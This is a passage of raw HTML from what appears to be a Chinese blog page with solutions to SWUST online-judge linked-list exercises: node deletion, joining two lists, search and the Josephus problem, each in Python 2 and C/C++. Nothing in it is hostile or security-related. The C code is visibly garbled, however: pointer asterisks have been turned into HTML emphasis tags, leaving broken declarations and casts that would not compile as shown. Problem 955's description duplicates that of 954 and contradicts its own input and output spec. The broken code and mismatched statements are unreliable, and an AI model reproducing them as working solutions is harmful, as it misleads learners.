class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">a = []</span><br><span class="line">b = <span class="keyword">int</span>(input())</span><br><span class="line">a = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">int</span>, raw_input().split()))</span><br><span class="line">k = <span class="keyword">int</span>(input())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> k&gt;<span class="number">1</span> <span class="keyword">and</span> k&lt;=b:</span><br><span class="line">    a.pop(k<span class="number">-2</span>)</span><br><span class="line">    <span class="keyword">for</span> i in range(len(a)):</span><br><span class="line">        print a[i],</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sys.<span class="built_in">stdout</span>.write(<span class="string">“error!”</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="953-4"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> elemtype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    elemtype data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <em><span class="title">next</span>;</em></span></span><br><span class="line">&#125;linknode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initlist</span><span class="params">(linknode &amp;L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    L=(linknode <em>)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linknode));</em></span><br><span class="line">    L-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">creatlist</span><span class="params">(linknode &amp;L,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    linknode <em>s,</em>r;</span><br><span class="line">    L=(linknode <em>)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linknode));</em></span><br><span class="line">    r=L;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s=(linknode )<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linknode));</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;s-&gt;data);</span><br><span class="line">        r-&gt;next=s;</span><br><span class="line">        r=s;</span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">listdelete</span><span class="params">(linknode <em>&amp;L,<span class="keyword">int</span> i)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j=<span class="number">1</span>;</span><br><span class="line">    linknode p=L,<em>q;</em></span><br><span class="line">    <span class="keyword">while</span>(j&lt;i<span class="number">-1</span>&amp;&amp;p!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        j++;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">        q=p-&gt;next;</span><br><span class="line">        p-&gt;next=q-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(q);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">desplist</span><span class="params">(linknode L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    linknode <em>p=L-&gt;next;</em></span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">“%d “</span>,p-&gt;data);</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(“\n”);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    linknode la;</span><br><span class="line">    <span class="keyword">int</span> n,i;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;n);</span><br><span class="line">    initlist(la);</span><br><span class="line">    creatlist(la,n);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;i);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(i&lt;=<span class="number">1</span>||i&gt;n+<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">“error!”</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        listdelete(la,i);</span><br><span class="line">        desplist(la);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div><h1 id="954-单链表的链接"><a href="#954-单链表的链接" class="headerlink" title="[954] 单链表的链接"></a>[954] 单链表的链接</h1><div class="tabs" id="954"><ul class="nav-tabs"><li class="tab active"><a href="#954-1">思路</a></li><li class="tab"><a href="#954-2">题目描述</a></li><li class="tab"><a href="#954-3">python代码实现</a></li><li class="tab"><a href="#954-4">数据结构实现</a></li></ul><div class="tab-content"><div class="tab-pane active" id="954-1"><div class="note default"><blockquote><br><p>上个链表的尾指向下个链表的头</p><br></blockquote></div></div><div class="tab-pane" id="954-2"><p><a href="http://acm.swust.edu.cn/#/problems/954/-1?_k=e56xy9" target="_blank" rel="noopener">传送门</a></p><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><blockquote><p>建立长度为n的单链表A和长度为m的单链表B。编程实现将B表链接在A表的尾端，形成一个单链表A。数据类型指定为字符型。</p></blockquote><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><blockquote><p>第一行为A表的长度n；<br>第二行为A表中的数据元素;<br>第三行为B表的长度m；<br>第四行为B表中的数据元素。</p></blockquote><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><blockquote><p>输出为链接好后的A表中的所有数据元素。</p></blockquote><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span></span><br><span class="line">A B C D </span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span></span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A B C D <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="954-3"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">a = []</span><br><span class="line">n1 = <span class="keyword">int</span>(input())</span><br><span class="line">a = <span class="built_in">list</span>(raw_input().split())</span><br><span class="line"></span><br><span class="line">b = []</span><br><span class="line">n2 = <span class="keyword">int</span>(input())</span><br><span class="line">b = <span class="built_in">list</span>(raw_input().split())</span><br><span class="line"></span><br><span class="line">c = a + b</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(len(c)):</span><br><span class="line">    print c[i],</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="954-4"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> elem;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    elem a;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <em><span class="title">next</span>;</em></span></span><br><span class="line">&#125;linknode;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initlist</span> <span class="params">(linknode &amp;L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    L=(linknode <em>)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linknode));</em></span><br><span class="line">    L-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">creatlist</span><span class="params">(linknode &amp;L,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    linknode <em>s,</em>r;</span><br><span class="line">    L=(linknode <em>)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linknode));</em></span><br><span class="line">    r=L;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s=(linknode )<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linknode));</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">“%c”</span>,&amp;s-&gt;a);</span><br><span class="line">        getchar();</span><br><span class="line">        r-&gt;next=s;</span><br><span class="line">        r=s;</span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">desplist</span><span class="params">(linknode <em>&amp;L)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    linknode p=L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">“%c “</span>,p-&gt;a);</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">combinelist</span><span class="params">(linknode <em>&amp;l,linknode </em>&amp;k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    linknode <em>p=l-&gt;next;</em></span><br><span class="line">    <span class="keyword">while</span>(p-&gt;next)</span><br><span class="line">    &#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;next=k-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m,n;</span><br><span class="line">    <span class="keyword">while</span>(~<span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;m))</span><br><span class="line">    &#123;</span><br><span class="line">        getchar();</span><br><span class="line">        linknode r,*s;</span><br><span class="line">        initlist(r);</span><br><span class="line">        creatlist(r,m);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;n);</span><br><span class="line">        getchar();</span><br><span class="line">        initlist(s);</span><br><span class="line">        creatlist(s,n);</span><br><span class="line">        combinelist(r,s);</span><br><span class="line">        desplist(r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div><h1 id="955-单链表上查找算法的实现"><a href="#955-单链表上查找算法的实现" class="headerlink" title="[955] 单链表上查找算法的实现"></a>[955] 单链表上查找算法的实现</h1><div class="tabs" id="955"><ul class="nav-tabs"><li class="tab active"><a href="#955-1">思路</a></li><li class="tab"><a href="#955-2">题目描述</a></li><li class="tab"><a href="#955-3">python代码实现</a></li><li class="tab"><a href="#955-4">数据结构实现</a></li></ul><div class="tab-content"><div class="tab-pane active" id="955-1"><div class="note default"><blockquote><br><p>遍历，查找</p><br></blockquote></div></div><div class="tab-pane" id="955-2"><p><a href="http://acm.swust.edu.cn/#/problems/955/-1?_k=a655hf" target="_blank" rel="noopener">传送门</a></p><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><blockquote><p>建立长度为n的单链表A和长度为m的单链表B。编程实现将B表链接在A表的尾端，形成一个单链表A。数据类型指定为字符型。</p></blockquote><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><blockquote><p>第一行为链表的长度n；<br>第二行为链表中的数据元素；<br>第三行为要找的结点i。</p></blockquote><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><blockquote><p>找到就输出ok，没找到就输出error。</p></blockquote><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span> <span class="number">10</span></span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ok</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="955-3"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">raw_input()</span><br><span class="line">if raw_input().find(raw_input()) != -1:</span><br><span class="line">    sys.<span class="built_in">stdout</span>.write(<span class="string">“ok”</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sys.<span class="built_in">stdout</span>.write(<span class="string">“error”</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="955-4"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> elem;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    elem data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <em><span class="title">next</span>;</em></span></span><br><span class="line">&#125;linknode;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initlist</span><span class="params">(linknode &amp;L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    L=(linknode <em>)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linknode));</em></span><br><span class="line">    L-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span class="keyword">void</span> <span class="title">creatlist</span><span class="params">(linknode &amp;L,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     linknode <em>r,</em>s;</span><br><span class="line">     r=(linknode <em>)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linknode));</em></span><br><span class="line">     r=L;</span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">     &#123;</span><br><span class="line">         s=(linknode )<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linknode));</span><br><span class="line">         <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;s-&gt;data);</span><br><span class="line">         r-&gt;next=s;</span><br><span class="line">         r=s;</span><br><span class="line">     &#125;</span><br><span class="line">     r-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">findlist</span><span class="params">(linknode <em>&amp;L,<span class="keyword">int</span> e)</em></span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      linknode s=L-&gt;next;</span><br><span class="line">      <span class="keyword">while</span>(s!=<span class="literal">NULL</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">if</span>(s-&gt;data==e)</span><br><span class="line">          &#123;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">“ok”</span>);</span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line">              s=s-&gt;next; </span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(s==<span class="literal">NULL</span>)</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">“error”</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125; </span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,e;</span><br><span class="line">    <span class="keyword">while</span>(~<span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;n))</span><br><span class="line">    &#123;</span><br><span class="line">        linknode *la;</span><br><span class="line">        initlist(la);</span><br><span class="line">        creatlist(la,n);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;e);</span><br><span class="line">        findlist(la,e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#数组实现</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">1000</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;x);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(x == a[i])</span><br><span class="line">        &#123;</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">         &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(flag == <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">“ok”</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">“error”</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure></div></div></div><h1 id="956-约瑟夫问题"><a href="#956-约瑟夫问题" class="headerlink" title="[956] 约瑟夫问题"></a>[956] 约瑟夫问题</h1><div class="tabs" id="956"><ul class="nav-tabs"><li class="tab active"><a href="#956-1">思路</a></li><li class="tab"><a href="#956-2">题目描述</a></li><li class="tab"><a href="#956-3">python代码实现</a></li><li class="tab"><a href="#956-4">数据结构实现</a></li></ul><div class="tab-content"><div class="tab-pane active" id="956-1"><div class="note default"><blockquote><br><p>百度：约瑟夫环</p><br></blockquote></div></div><div class="tab-pane" id="956-2"><p><a href="http://acm.swust.edu.cn/#/problems/956/-1?_k=uijj3z" target="_blank" rel="noopener">传送门</a></p><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><blockquote><p>n个人围成一个圈，每个人分别标注为1、2、…、n，要求从1号从1开始报数，报到k的人出圈，接着下一个人又从1开始报数，如此循环，直到只剩最后一个人时，该人即为胜利者。例如当n=10,k=4时，依次出列的人分别为4、8、2、7、3、10，9、1、6、5，则5号位置的人为胜利者。给定n个人，请你编程计算出最后胜利者标号数。（要求用单循环链表完成。）</p></blockquote><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><blockquote><p>第一行为人数n;<br>第二行为报数k。</p></blockquote><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><blockquote><p>输出最后胜利者的标号数。</p></blockquote><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span> </span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="956-3"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">n = <span class="keyword">int</span>(raw_input())</span><br><span class="line">m = <span class="keyword">int</span>(raw_input())</span><br><span class="line">s = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">2</span>,n+<span class="number">1</span>):</span><br><span class="line">    s = (s + m) % i</span><br><span class="line">a = s + <span class="number">1</span></span><br><span class="line">sys.stdout.write(‘%d’%a)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="956-4"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 